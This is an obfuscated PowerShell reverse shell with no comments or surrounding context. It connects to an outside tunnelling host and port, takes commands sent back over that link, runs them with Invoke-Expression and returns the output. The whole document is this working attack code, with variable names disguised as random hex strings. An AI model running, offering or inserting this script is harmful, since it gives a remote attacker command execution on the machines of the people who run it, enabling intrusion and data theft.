$5f46caaff4d44765a92cbf4f7d8ca3ce = "cool-snowflake-73432.pktriot.net"; $c066885fc2744a7684750bb62049dba7 = 22816; $4dc7f599b8934b19949383e774f54bba = New-Object Net.Sockets.TCPClient($5f46caaff4d44765a92cbf4f7d8ca3ce, $c066885fc2744a7684750bb62049dba7); $c59e9c32e3304644838077bb4a637019 = $4dc7f599b8934b19949383e774f54bba.GetStream(); $9665e9aa32dc437d95008b521c6f73dd = New-Object IO.StreamReader($c59e9c32e3304644838077bb4a637019); $da73c2eb082f4dc7a4722f1c1a1bba3d = New-Object IO.StreamWriter($c59e9c32e3304644838077bb4a637019); $da73c2eb082f4dc7a4722f1c1a1bba3d.AutoFlush = $true; $79f1606bc39f4dc4899fdae66ecf968a = New-Object System.Byte[] 1024; while ($4dc7f599b8934b19949383e774f54bba.Connected) { while ($c59e9c32e3304644838077bb4a637019.DataAvailable) { $2588211b52c44b4fb3f2d050e3cc034b = $c59e9c32e3304644838077bb4a637019.Read($79f1606bc39f4dc4899fdae66ecf968a, 0, $79f1606bc39f4dc4899fdae66ecf968a.Length); $59a53cf3d6bd43f98802d4dd3e6dc0c1 = ([text.encoding]::UTF8).GetString($79f1606bc39f4dc4899fdae66ecf968a, 0, $2588211b52c44b4fb3f2d050e3cc034b -1) }; if ($4dc7f599b8934b19949383e774f54bba.Connected -and $59a53cf3d6bd43f98802d4dd3e6dc0c1.Length -gt 1) { $c3dadff7a9934eb7b05a3b8b74f399fd = try { Invoke-Expression ($59a53cf3d6bd43f98802d4dd3e6dc0c1) 2>&1 } catch { $_ }; $da73c2eb082f4dc7a4722f1c1a1bba3d.Write("$c3dadff7a9934eb7b05a3b8b74f399fd`n"); $59a53cf3d6bd43f98802d4dd3e6dc0c1 = $null } }; $4dc7f599b8934b19949383e774f54bba.Close(); $c59e9c32e3304644838077bb4a637019.Close(); $9665e9aa32dc437d95008b521c6f73dd.Close(); $da73c2eb082f4dc7a4722f1c1a1bba3d.Close()
